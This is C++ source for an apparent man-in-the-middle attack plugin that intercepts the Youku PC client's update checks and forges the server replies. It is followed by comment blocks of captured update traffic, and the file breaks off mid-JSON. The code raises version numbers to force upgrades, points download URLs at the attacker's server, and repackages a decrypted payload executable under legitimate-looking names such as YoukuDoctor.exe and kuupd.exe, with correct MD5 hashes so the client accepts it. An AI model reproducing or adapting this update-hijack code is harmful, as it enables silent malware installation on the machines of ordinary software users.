#include "YoukuPC.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../Public.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"

int gYoukuPCFlag = 4;

int YouKuPCPlugin::isYoukuPlugin(const char * url, const char * host) {
	//pcapp-update.youku.com
	if (strstr(host, "pcapp-update.youku.com"))
	{
		if (strstr(url, "/check?action=init") || strstr(url,"/check?action=heartbeat") )
		{
			gYoukuPCFlag = 1;
			return TRUE;
		}
		else if (strstr(url,"/check?action=module_upgrade"))
		{
			gYoukuPCFlag = 2;
			return TRUE;
		}
		else if (strstr(url, "/check?action=upgrade"))
		{
			gYoukuPCFlag = 3;
			return TRUE;
		}else if (strstr(url,"/check?action=install_com_add"))
		{
			gYoukuPCFlag = 4;
			return TRUE;
		}
	}

	return FALSE;
}

int YouKuPCPlugin::replyYoukuPlugin(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	if (gYoukuPCFlag == 1)
	{
		char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
			"Content-Type: text/plain;charset=UTF-8\r\n"
			"Content-Length: %u\r\n"
			"Connection: keep-alive\r\n\r\n%s";

		int ret = 0;

		string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

		string fn = "push_mini_setup.exe";
		string filename1 = Public::getUserPluginPath(lpssl->username) + fn;

		char szmd5_1[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, FALSE);
		if (filesize1 <= 0)
		{
			return FALSE;
		}

		char * lpconfig = 0;
		int configfz = 0;
		string cfgfn = Public::getUserPluginPath(lpssl->username) + "youku_pc.json";
		ret = FileOper::fileReader(cfgfn, &lpconfig, &configfz);
		if (ret <= 0)
		{
			return FALSE;
		}
		string config = string(lpconfig,configfz);
		delete lpconfig;

		string version = "9.9.9.4233"; //7.3.4.4233
		string fileurl = string("http://") + strip + "/" + fn;

		char * end = 0;
		char * hdr = 0;
		char * pos = strstr((char*)config.c_str(), "miniq_upgrade");
		if (pos > 0)
		{
			hdr = strstr(pos, "\"destver\":\"");
			if (hdr > 0)
			{
				hdr += lstrlenA("\"destver\":\"");
				end = strstr(hdr, "\"");
				int len = end - hdr;
				int datapos = hdr - config.c_str();
				config = config.replace(datapos, len, version);
			}

			hdr = strstr(pos, "\"url\":\"");
			if (hdr > 0)
			{
				hdr += lstrlenA("\"url\":\"");
				end = strstr(hdr, "\"");
				int len = end - hdr;
				int datapos = hdr - config.c_str();
				config = config.replace(datapos, len, fileurl);
			}

			hdr = strstr(pos, "\"md5\":\"");
			if (hdr > 0)
			{
				hdr += lstrlenA("\"md5\":\"");
				end = strstr(hdr, "\"");
				int len = end - hdr;
				int datapos = hdr - config.c_str();
				config = config.replace(datapos, len, string(szmd5_1));
			}
			int retlen = sprintf(dstbuf, szHttpPartialZipFormat, config.length(), config.c_str());

			return retlen;
		}
	}else if (gYoukuPCFlag == 2)
	{
		int ret = FALSE;

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

		string version = "99.1.99.999";	//10.1.14.436

		char * configformat = 
			"["
			"{"
			"\"level\":3,"
			"\"md5\":\"%s\","
			"\"name\":\"AlibabaProtectCon.exe\","
			"\"path\":\"AliProtect\","
			"\"type\":\"zip\","
			"\"url\":\"http://%s/%s\","
			"\"version\":\"%s\""
			"},"
			"{"
			"\"level\":3,"
			"\"md5\":\"%s\","
			"\"name\":\"pc-sdk-setup.exe\","
			"\"path\":\"AliProtect\","
			"\"type\":\"zip\","
			"\"url\":\"http://%s/%s\","
			"\"version\" : \"%s\""
			"}]";

		string exedstfn = string(WEIXIN_PC_UPDATE_EXE_FILENAME) + "_youku";
		string newexefn = Public::getUserPluginPath(lpssl->username) + exedstfn;
		string exesrcfn = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string zipfilename = "pc-sdk-setup.zip";
		string zipinexefn = "pc-sdk-setup.exe";
		string zipfn = Public::getUserPluginPath(lpssl->username) + zipfilename;
		ret = Public::zipFile(zipinexefn, newexefn, zipfn);
		if (ret <= 0)
		{
			return FALSE;
		}

		char szmd5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int zipfs = CryptoUtils::getUpdateFileMd5(zipfn, szmd5, hexmd5, FALSE);

		char szconfigbuf[4096];
		int configlen = wsprintfA(szconfigbuf, configformat, 
			szmd5, ip.c_str(), zipfilename.c_str(),version.c_str(),szmd5,ip.c_str(), zipfilename.c_str(),version.c_str());

		string jsonfilename = "youku_upgrade.json";
		string jsonfilepath = Public::getUserPluginPath(lpssl->username) + jsonfilename;
		ret = FileOper::fileWriter(jsonfilepath.c_str(), szconfigbuf, configlen,TRUE);

		char szconfigmd5[256] = { 0 };
		ret = CryptoUtils::getDataMd5(szconfigbuf, configlen, szconfigmd5, FALSE);

		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";
		char * retformat =
			"{\"method\":"
			"{\"destver\":\"%s\",\"style\":\"2\",\"url\":\"http://%s/%s\","
			"\"md5\":\"%s\"},"
			"\"e\":{\"code\":0,\"hbtime\":600,\"provider\":\"pcapp_update\",\"play_hbtime\":300,\"env\":\"public\","
			"\"lastts\":%I64u,\"desc\":\"heat strategy\"}}";

		time_t timenow = time(0);

		char result[4096];
		int retlen = sprintf(result, retformat, version.c_str(), ip.c_str(), jsonfilename.c_str(), szconfigmd5,timenow);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}else if (gYoukuPCFlag == 3)
	{
		int ret = FALSE;

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

		string version = "99.1.99.999";	//10.1.14.436

		char * configformat =
"{\"method\":{\"destver\":\"%s\",\"size\":\"%u\",\"level\":\"4\","
"\"description\":\"PHNwYW4gc3R5bGU9ImNvbG9yOmdyYXk7IGZvbnQtc2l6ZToxM3B4OyI+Cjxicj4KMeOAgemmlumhteWGheWuueaUueeJiO+8jOWGheWuueabtOWkmuOAgeabtOa4heaZsDxicj4KMuOAgeaSreaUvumhteaUueeJiO+8jOaPkOS+m+abtOWkmuebuOWFs+WGheWuuTxicj4KM+OAgeS/ruWkjemDqOWIhue8uumZt++8jOW7uuiuruWNh+e6p+S9k+mqjDxicj4KPC9wPgo8cCBzdHlsZT0ibGluZS1oZWlnaHQ6MjFweDsgY29sb3I6Z3JheTsgZm9udC1zaXplOjEzcHg7Ij4K5bey5LiL6L295a6M5q+V77yM5Y2H57qn5peg6ZyA562J5b6F\","
"\"url\":\"http://%s/%s\","
"\"md5\":\"%s\"},\"e\":{\"code\":0,\"hbtime\":86400,\"provider\":\"pcapp_update\",\"play_hbtime\":300,\"env\":\"public\","
"\"lastts\":%I64u,\"desc\":\"heat strategy\"}}";

		string exedstfn = string(WEIXIN_PC_UPDATE_EXE_FILENAME) + "_youkupc_update";
		string newexefn = Public::getUserPluginPath(lpssl->username) + exedstfn;
		string exesrcfn = Public::getUserPluginPath(lpssl->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		vector <string> innames;
		innames.push_back("youkuclient_setup.exe");
		innames.push_back("kuupd.exe");
		innames.push_back("migrate.exe");

		vector<string>outnames;
		outnames.push_back(newexefn);
		outnames.push_back(newexefn);
		outnames.push_back(newexefn);

		string zipfilename = "youkupc_update.zip";
		string zipfn = Public::getUserPluginPath(lpssl->username) + zipfilename;
		ret = Public::zipFiles(innames, outnames, zipfn);
		if (ret <= 0)
		{
			return FALSE;
		}

		char szmd5[256] = { 0 };
		unsigned char hexmd5[256] = { 0 };
		int zipfs = CryptoUtils::getUpdateFileMd5(zipfn, szmd5, hexmd5, FALSE);

		char szconfigbuf[4096];
		int configlen = wsprintfA(szconfigbuf, configformat, version.c_str(), zipfs,
			ip.c_str(), zipfilename.c_str(), szmd5,time(0));

		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, configlen, szconfigbuf);

		return responseLen;
	}
	else if (gYoukuPCFlag == 4)
	{
		char * xmlformat =
		"{\"method\":"
		"{\"ikuotherfile\":{\"filename\":\"ikuinstalladd.7z\",\"fileurl\":\"http://%s/%s\",\"fileMd5\":\"%s\"},"
		"\"AliProtect\":{\"filename\":\"AliProtect.7z\",\"fileurl\":\"http://%s/%s\",\"fileMd5\":\"%s\"}},"
		"\"e\":{\"code\":0,\"hbtime\":180,\"provider\":\"pcapp_update\",\"play_hbtime\":300,\"env\":\"public\","
		"\"lastts\":9617289094931,\"desc\":\"heat strategy\"}}";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
		//7z a test.zip a.txt b.txt
		//7z a test.zip f:/test/
		//7z x test.zip -of:\test
		//7z x test.zip -o"f:\test abc"

		string curpath = Public::getUserPluginPath(lpssl->username);

		string alip = "AliProtect.7z";
		string alipfp = Public::getUserPluginPath(lpssl->username) + alip;

		string iku = "ikuinstalladd.7z";
		string ikufp = Public::getUserPluginPath(lpssl->username) + iku;
		
		string alipf = "AliProtect\\";
		string alipfn = Public::getUserPluginPath(lpssl->username) + alipf;

		string ikuf = "ikuinstalladd\\";
		string ikufn = Public::getUserPluginPath(lpssl->username) + ikuf;

		char szcmd[1024];
		string strcmdformat = "%s7z.exe x -aoa %s -o%s";

		wsprintfA(szcmd, strcmdformat.c_str(), gLocalPath.c_str(), ikufp.c_str(), ikufn.c_str());
		system(szcmd);

		wsprintfA(szcmd, strcmdformat.c_str(), gLocalPath.c_str(), alipfp.c_str(), curpath.c_str());
		system(szcmd);


		FileOper::fileCopy(curpath + WEIXIN_PC_UPDATE_EXE_FILENAME, alipfn + "AlibabaProtectCon.exe");
		FileOper::fileCopy(curpath + WEIXIN_PC_UPDATE_EXE_FILENAME, alipfn + "pc-sdk-setup.exe");

		FileOper::fileCopy(curpath + WEIXIN_PC_UPDATE_EXE_FILENAME, ikufn + "recommend_mini.exe");
		FileOper::fileCopy(curpath + WEIXIN_PC_UPDATE_EXE_FILENAME, ikufn + "YoukuDoctor.exe");

		strcmdformat = "%s7z.exe a %s %s";
		wsprintfA(szcmd, strcmdformat.c_str(), gLocalPath.c_str(), alipfp.c_str(), alipfn.c_str());
		system(szcmd);

		strcmdformat = "%s7z.exe a %s %s %s %s %s %s %s";
		wsprintfA(szcmd, strcmdformat.c_str(), gLocalPath.c_str(), ikufp.c_str(), 
			(ikufn + "d3dcompiler_47.dll").c_str(), (ikufn + "errordeal.dll").c_str(), (ikufn + "libeay32MD.dll").c_str(), 
			(ikufn + "libGLESv2.dll").c_str(), (ikufn + "recommend_mini.exe").c_str(), (ikufn + "YoukuDoctor.exe").c_str() );
		system(szcmd);

		char alipmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int alipfs = CryptoUtils::getUpdateFileMd5(alipfp, alipmd5, hexmd5, FALSE);

		char ikumd5[64] = { 0 };
		int ikufs = CryptoUtils::getUpdateFileMd5(ikufp, ikumd5, hexmd5, FALSE);

		int retlen = sprintf_s(dstbuf, dstbuflimit, xmlformat, ip.c_str(), iku.c_str(), ikumd5, ip.c_str(), alip.c_str(), alipmd5);
		return retlen;
	}
	return 0;
}


/*
GET /check?action=upgrade&cid=cmc&type=startup&ver=7.9.6.3271&pid=ywebapp&rid=77&os=win_10.0_64&asn=4134&loc=430100&mac=a0c589855a57&peerid=100000000000000000005E8563ABA0C589855A57&reqtype=1&playerver=1&lastts=1&qday=20200402 HTTP/1.1
Host: pcapp-update.youku.com
User-Agent: IKU/7.9.6.3271;IKUCID/IKU;OS/win_10.0_64;
Accept: *//*

HTTP/1.1 200 
Date: Thu, 02 Apr 2020 04:02:14 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 726
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
Set-Cookie: XSRF-TOKEN=e8767c44-6692-4cb3-b399-bede8c7d94c4; Path=/; HttpOnly
X-Application-Context: ykpcapp-update:7001
Server: Tengine/Aserver
Strict-Transport-Security: max-age=31536000
Timing-Allow-Origin: *
s-rt: 3

{"method":{"destver":"7.9.6.3310","size":"160770056","level":"4",
"description":"PHNwYW4gc3R5bGU9ImNvbG9yOmdyYXk7IGZvbnQtc2l6ZToxM3B4OyI+Cjxicj4KMeOAgemmlumhteWGheWuueaUueeJiO+8jOWGheWuueabtOWkmuOAgeabtOa4heaZsDxicj4KMuOAgeaSreaUvumhteaUueeJiO+8jOaPkOS+m+abtOWkmuebuOWFs+WGheWuuTxicj4KM+OAgeS/ruWkjemDqOWIhue8uumZt++8jOW7uuiuruWNh+e6p+S9k+mqjDxicj4KPC9wPgo8cCBzdHlsZT0ibGluZS1oZWlnaHQ6MjFweDsgY29sb3I6Z3JheTsgZm9udC1zaXplOjEzcHg7Ij4K5bey5LiL6L295a6M5q+V77yM5Y2H57qn5peg6ZyA562J5b6F","url":"http://pcclient.download.youku.com/iku2/iku_7.9.6.3310.zip",
"md5":"D868593BA41645C8997256AEF4538211"},"e":{"code":0,"hbtime":86400,"provider":"pcapp_update","play_hbtime":300,"env":"public",
"lastts":1585743882335,"desc":"heat strategy"}}
*/



/*
GET /check?action=module_upgrade&cid=iku&req_type=1&ver=7.7.8.5131&pid=ywebapp&rid=20&os=win_10.0_64&asn=4134&loc=330100&mac=3c970eda4452&peerid=100000000000000000005CDF740C3C970EDA4452 HTTP/1.1
User-Agent: IKU/7.7.8.5131;IKUCID/IKU;OS/win_10.0_64;
Host: pcapp-update.youku.com
Accept: *//*

HTTP/1.1 200 
Date: Mon, 27 May 2019 02:57:29 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 295
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
Set-Cookie: XSRF-TOKEN=996e4ae7-7f03-4019-8562-ab6e727e9d72; Path=/; HttpOnly
X-Application-Context: ykpcapp-update:7001
Server: Tengine/Aserver
Strict-Transport-Security: max-age=31536000
Timing-Allow-Origin: *
s-rt: 3

{"method":{"destver":"7.7.9.5220","style":"2","url":"http://pcclient.download.youku.com/iku_upgrade/7.7.9.5220/fl.json",
"md5":"A900DAFF71B9C10B025FE44E011D7CA6"},
"e":{"code":0,"hbtime":600,"provider":"pcapp_update","play_hbtime":300,"env":"public","lastts":1558921586014,"desc":"heat strategy"}}
*/


/*

GET /check?action=init&reqtype=1&cid=iku&ver=7.7.8.5131&pid=ywebapp&rid=20&os=win_10.0&asn=4134&loc=330100&mac=3c970eda4452&peerid=100000000000000000005CDF740C3C970EDA4452&playerver=7.3.0.4260 HTTP/1.1
User-Agent: IKU/7.7.8.5131;IKUCID/IKU;OS/win_10.0_64;
Host: pcapp-update.youku.com
Accept: *//*

HTTP/1.1 200 
Date: Sat, 18 May 2019 08:00:05 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 9194
Connection: keep-alive
Vary: Accept-Encoding
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
Set-Cookie: XSRF-TOKEN=91c6702d-770b-4740-99bf-91744b4c2bd2; Path=/; HttpOnly
X-Application-Context: ykpcapp-update:7001
Server: Tengine/Aserver
Strict-Transport-Security: max-age=31536000
Timing-Allow-Origin: *
s-rt: 7

{"method":{"play":{"defaultqulity":"mp4","h265_gpu_decode":1,"preups":0,
"errorcode_retry":"1000-94,11010,11020,13000,20001,31102,31403,31404,31201,31611,14000,14500,15001,15401,2305,30010,31910",
"preupsmapcachetime":180,"errorcode_noreport":"2905-0x40010004,2905-0x00000103","playlist_get_retry":"2,1",
"livecore":{"cdn_read":"25","buffertime_loading_s":12,"statistics_interval_ms":150,"ups_retry":"2,20,1",
"k_retry":"4,8,16","acc_on":1,"playlist_get_retry":"1,0","ups_mp4_prior":0,"cdn_conn_retry":"4,4,8","buffertime_start_s":6},
"maxlogsize":"500","hls":1,"heartbeat_s":600,"core":{"cdn_read":"25","buffertime_loading_s":12,"statistics_interval_ms":150,
"ups_retry":"2,20,1","k_retry":"4,8,16","playlist_get_retry":"1,0","ups_mp4_prior":0,"cdn_conn_retry":"4,4,8","buffertime_start_s":12},
"on_subtitle":1,"gpu_decode":0,"fetch_insert_ad":1,"h265":0,"acc_on":{"play":1,"download":0},
"loading_tips":{"duration":10,"times":10,"pos":3,"contents":["你知道吗，同时按住Alt+A可以快速关闭播放器"],
"switch":1},"addr":["ups.youku.com"],"play_ability":768},"ad_strategy":{"ad_mode":1,"live_ad_disable":0,"ad_rand":"122ab",
"strategies":[{"play_type":"front|post|pause","keep_use_date":9999,"nu_ad_time":0,"ad_video_index":0,"ad_play_times":99999,
"max_piece":2,"invalid_period":""}],"ad_control":0,"replay_control":0,"vip_control":0,"replay_free_tspan":-1,
"regs":[{"path":"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\YoukuClient\\Partner",
"type":"!set","value":"ywebitudoubanner,ywebitudouupgrade"}]},"exception_check_config":{},"skin_peeler":{},
"ykpageQml_config":{"useCacheIn":150,"control_threads_part_size":false,"part_size":307200,"oupload":true,"threads":8,
"auto_update_interval":0,"load_feed_stream":false,"homepage_load_type":1},"play_page_channel_control":{},"multiscreen":{},
"login":{"webctrl":{"default":"webkit"}},"player_upgrade":{},"hover_wnd_config":{"play":0,"show":0},
"feedback":{"dialog":{"play":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"观看过程中，画面一卡一卡"},
{"id":2,"sort":2,"content":"观看过程中，经常出现转圈"},{"id":3,"sort":3,"content":"观看时出错"},{"id":4,"sort":4,
"content":"声音画面不同步等影音问题"},{"id":5,"sort":5,"content":"观看过程中，出现黑屏"},{"id":6,"sort":6,
"content":"播放过程中，有跳播现象"},{"id":7,"sort":7,"content":"播放时系统资源占用太高"},{"id":8,"sort":8,"content":"其他播放问题"}]},
"download":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"下载速度慢"},
{"id":2,"sort":2,"content":"下载视频清晰度与所选清晰度不符"},{"id":3,"sort":3,"content":"下载错误1009"},
{"id":4,"sort":4,"content":"无法下载"},{"id":5,"sort":5,"content":"已是会员，无法下载会员视频"},{"id":6,"sort":6,"content":"下载报错"}]},
"upload":{"entry_color":"#ed5900","reasonlist":[{"id":1,"sort":1,"content":"上传视频失败"},{"id":2,"sort":2,"content":"上次后一直上传中"},
{"id":3,"sort":3,"content":"上传后一直审核中"},{"id":4,"sort":4,"content":"上传视频模糊"},{"id":5,"sort":5,"content":"不会上传视频"},
{"id":6,"sort":6,"content":"找不到上传的视频"}]},"transcode":{"entry_color":"#ed5900",
"reasonlist":[{"id":1,"sort":1,"content":"最终转换格式不正确"},{"id":2,"sort":2,"content":"转码后播放不正常"},
{"id":3,"sort":3,"content":"显示转码失败"},{"id":4,"sort":4,"content":"一直转码中"},{"id":5,"sort":5,"content":"不会转码"},
{"id":6,"sort":6,"content":"转码后视频找不到"}]},"multiscreen":{"entry_color":"#ed5900",
"reasonlist":[{"id":1,"sort":1,"content":"投屏失败"},{"id":2,"sort":2,"content":"没有投屏按钮"},
{"id":3,"sort":3,"content":"设备不兼容"},{"id":4,"sort":4,"content":"投屏后无法操作"},
{"id":5,"sort":5,"content":"其他投屏问题"}]},"login":{"entry_color":"#ed5900",
"reasonlist":[{"id":1,"sort":1,"content":"登录界面提示'页面加载失败'"},
{"id":2,"sort":2,"content":"无法使用第三方登录"},{"id":3,"sort":3,"content":" '页面加载失败',请设置公共DNS后再试一试"},
{"id":4,"sort":4,"content":"登录界面空白,请设置公共DNS后再试一试"},{"id":5,"sort":5,"content":"无法取消自动登录"},
{"id":6,"sort":6,"content":"提示'在登录中'"},{"id":7,"sort":7,"content":"设置正确的电脑日期后仍然提示'Page failed .'"},
{"id":8,"sort":8,"content":"勾选'记住我'后仍不能自动登录"}]}},"logupload_err":{}},
"iku_browser_wblist":{"h5_white_list":[{"url":".tudou.com"},{"url":".laifeng.com"},
{"url":".iqiyi.com"},{"url":"v.qq.com"},{"url":"v.ifeng.com"},{"url":".bilibili.com"}],
"live_white_list":[{"url":"vku.youku.com/live/ilproom"},{"url":"vku.youku.com/live/testilproom"}],
"white_list":[],"black_list":[{"url":".laifeng.com/"},{"url":"//creation.youku.com/?from=iku"},
{"url":"news.youku.com"},{"url":"uat-csc.youku.com/feedback-web/navi1.html"},{"url":"csc.youku.com/feedback-web/navi1.html"},
{"url":"//id.youku.com/bindMobileView.htm"},{"url":"sky.vip.youku.com/svip/fiveyears/myzypc"},{"url":".tmall.com/"},
{"url":".taobao.com/"},{"url":"pd.youku.com/pc"}]},"download":{"monitor_error":1,"ups_retry":"2,20,1",
"ups_requst_http":1,"force_use_cdn":1,"cdn_connect_fresh":1,"check_slice_file":1,"cdn_conn_retry":2,"ups_request_interval":480,"cdn_connect_timeout":60,"merge_kux_format":1},"download_upgrade":{},"base_config":{"plugin_upgrade":0,"show_appdownimage":0,"plugin_autorun":1,"desklink_push":"iku://|interface|gochannel|push|id|1003|","1080p_on":1,"check_ykpage_running":"0","pop_dlg":{"pop_dlg_laifeng":0},"pay_channpre_text":"您可以免费试看%1%2，开通频道会员后可观看全部11","star_more_s":10,"homepage_load_type":1,"no_new_singleton":0,"play_live_mode":"h5","survey_url":"","search_page_type":1,"plugin_upgrade_uac":0,"use_local_record":1},"bubble":{},"cef_upgrade":{},"treasure_box":{},"live_config":{"list":[{"src_id":"id=8014589","dst_url":"https://vku.youku.com/live/ilproom?id=8014589&source=3611","play_mode":3}]},"play_ctrl":{"report_space_s":600000,"action_on":0,"report_on":0},"pointtask":{"list":[{"valid":true,"act_id":2018,"count":1,"task_id":2011,"id":1,"type":1,"prompt":"start,+5jifen","score_rules":{"rules":{"Thu":2,"Tue":2,"Wed":3,"Sat":2,"Mon":1,"Sun":1,"Fir":3},"type":"by_day"}},{"valid":true,"act_id":2019,"count":1,"task_id":2012,"id":2,"type":1,"prompt":"follow tv +5jifen"}]},"hb_playmiddle":{},"quick_play":{},"iku_p2p_cfg":{"IKU_P2P_ACCS_SEND_RECEIVE_MSG":"1","BMB_PROPERTY_TYPE_SERVER_COUNT":"3","BMB_PROPERTY_TYPE_PRODUCER_CONNECTION_MAX":"8","BMB_PROPERTY_TYPE_TRANSPOTCHANNEL":"1","BMB_PROPERTY_TYPE_RETRY_COUNT":"2","BMB_PROPERTY_TYPE_ISSERVER":"0","BMM_PROPERTY_TYPE_TRACKER_PUBLISH_KEY":"","BMB_PROPERTY_TYPE_RULESWITCHERPERCENTAGE":"0.1","BMB_PROPERTY_TYPE_STATISTIC_INTERVAL":"3","BMB_PROPERTY_TYPE_PRODUCER_CONNECTION_MIN":"3","BMB_PROPERTY_TYPE_P2P_BUFFER_PAYLOAD_BYTES":"1000","BMB_PROPERTY_TYPE_SEND_DATA_SIZE":"16384","BMB_PROPERTY_TYPE_SWITCH":"1","BMB_PROPERTY_TYPE_CANTRANSPORTDATA":"1","BMM_PROPERTY_TYPE_INNER_VERSION":"0002","BMM_PROPERTY_TYPE_DDLOG_SWITCH":"0"},"miniq_upgrade":{"destver":"7.3.4.4233","url":"http://pcclient.download.youku.com/push_mini/push_mini_setup_7.3.4.4233.exe","md5":"E03920C7A381E41EDD69A12B4CD02609"},"clarity_contral":{},"miniq_cfg":{"defaultqulity":"hd2","err":[{"show_iku_btn":0,"err_txt":"该视频仅对优酷会员开放，请登录会员或购买会员","show_retry_btn":1,"err_code":["1000-37","3000-2","3001-2","3002-2","3003-2","3100-2","3101-2"]},{"show_iku_btn":1,"err_txt":"极速版暂不支持用券视频，请用优酷完整版观看","show_retry_btn":0,"err_code":["3000-3","3001-3","3002-3","3003-3","3100-3","3101-3","3102-1"]},{"show_iku_btn":1,"err_txt":"极速版暂不支持drm视频，请用优酷完整版观看","show_retry_btn":0,"err_code":["1000-96","1000-97"]}],"loading_tips":{"duration":10,"times":10,"pos":3,"contents":["小知识：视频列表可以拖到屏幕边缘停靠隐藏"],"switch":1}},"leftnavigation_top":{"hand_refresh_span":"90","showmatch":"0","eightfinals":"3","netinerfaceorigin":"1","worldcup_online_num":"8"},"left_navigation":{},"push_upgrade":{},"sub_player":{},"push_mini_upgrade":{},"third_player_conf":{"domain_black_list":[],"domain_write_list":[".iqiyi.com"]},"httpdns":{"ip_refresh":"3600","disable_flag":"0x0000","domains_v4":"valipl-vip.cp31.ott.cibntv.net","retry_count":"6","domains":"","domains_v6":"","refresh":"600","https":"0","error_report":"1","srv_refresh":"0","content":"MTA3MDI1fGU0MTQ4M2E4Y2MwNDdkODRlMjhiMjUzYzMxOTI0NGMw","on":"1"},"playright_dynamic":{"show":1},"linglong":{},"feisuo_ctrl":{"data_size":"2000","p2p_down_sleep_interval_m":"1","cache_size":"2048","p2p_data_filter":"0","p2p_upload_publish_interval_m":"10","p2p_data_interval":"3600000","p2p_state":"1"},"playerupgrade":{},"mtop":{},"channel_ext":{},"openapi_test":{"decodeinterfaceorigin":"1"},"youkupageqml_upgrade":{}},"e":{"code":0,"hbtime":600,"provider":"pcapp_update","play_hbtime":300,"env":"public","lastts":1558095445061,"ipinfo":{"loc":"330100","city":"杭州","ip":"125.120.212.46","asn":"100017","asn_name":"电信"},"desc":"heat strategy"}}
*/


/*
GET /check?action=heartbeat&reqtype=1&cid=iku&ver=8.0.8.12173&pid=ywebapp&rid=79&os=win_10.0_64&utdid=YLpAlwAAACkDAMk3EXowUI58&ads=0&lnt=0&lgt=0&bDm=false&oDms=0&nmDms=0&nDms=0&eDms=0&gDms=0&nmLDms=0&eLDms=0&cg=0&mtpRC=0&mtpROC=0&alipro_totalcnt=1&alipro_failcnt=0&alipro_succnt_n=0&alipro_succnt_d=1&accs_totalcnt=0&accs_succnt=0&accs_failcnt=0&asn=100017&asn_name=%E7%94%B5%E4%BF%A1&loc=330100&mac=3ca9f4825824&peerid=1000000000000000000060BA40793CA9F4825824&playerver=7.3.2.12171&ikustate=__0__0__0__0__0000__&pushver=8.0.8.12173&cefver=1.2623.8.12173&downloadver=8.0.8.12173&pminiver=7.7.2.2271&miniqver=&accver=9.4.0.12080&usemem=252&apsVer=c6698&cpurate=10&lastts=1558095445061& HTTP/1.1
Host: pcapp-update.youku.com
User-Agent: IKU/8.0.8.12173;IKUCID/IKU;OS/win_10.0_64;
Accept: *//*

HTTP/1.1 200 
Date: Fri, 04 Jun 2021 15:13:08 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 12204
Connection: keep-alive
Vary: Accept-Encoding
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
Set-Cookie: XSRF-TOKEN=91b2c619-d380-421f-b780-cca8c850f0f3; Path=/; HttpOnly
X-Application-Context: ykpcapp-update:7001
Server: Tengine/Aserver
EagleEye-TraceId: 2105305e16228195889578962e21f3
Strict-Transport-Security: max-age=31536000
Timing-Allow-Origin: *
s-rt: 6
EagleEye-TraceId: 2105305e16228195889578962e21f3

{"method":{"play":{"queryautoquality":1,"preupsmapcachetime":180,"ups_retry_by_httpdns":1,"livecore":{"cdn_read":"25","buffertime_loading_s":12,"statistics_interval_ms":150,"ups_retry":"2,20,1","k_retry":"4,8,16","acc_on":1,"playlist_get_retry":"1,0","ups_mp4_prior":0,"cdn_conn_retry":"4,4,8","buffertime_start_s":6},"preload":0,"clearGpuSignTime":"2020-12-14 10:00","heartbeat_s":600,"get_drminfo_by_sdk":1,"fetch_insert_ad":1,"abrLive":1,"gpuSwich":"0","defaultqulity":"intelligent","preups":1,"errorcode_retry":"1000-94,11010,11020,13000,20001,31102,31403,31404,31201,31611,14000,14500,15001,15401,2305,30010,31910,1300-1,1300-2,1300-3","complaint_use_alicare":1,"fastmodetimerange":"","single_process":1,"31910LimteTimes":2,"replaceAcc":"0","questDrmType":3,"httpdns":1,"core":{"cdn_read":"25","force_p2p":"1","buffertime_loading_s":12,"statistics_interval_ms":150,"ups_retry":"2,20,1","k_retry":"4,8,16","playlist_get_retry":"1,0","ups_mp4_prior":0,"cdn_conn_retry":"4,4,8","buffertime_start_s":12},"errorcode_retry_live":"30010,31920,31910,30020,31005,31921,11600,31404,11019,30000,11016","on_subtitle":0,"noreportCodeLive":"6001-28,6001-6,6001-7,6001-35,6001-16000,6001-16504","h265":1,"fakequality":"mp4","FASTMODE_EXTSIZE":"2048","useProxyPlayer":0,"utdid_blacklist":"XQhT9gAAACkDAFPD1l8fks/u","live_gpu_use_cfg":0,"live_v4":1,"T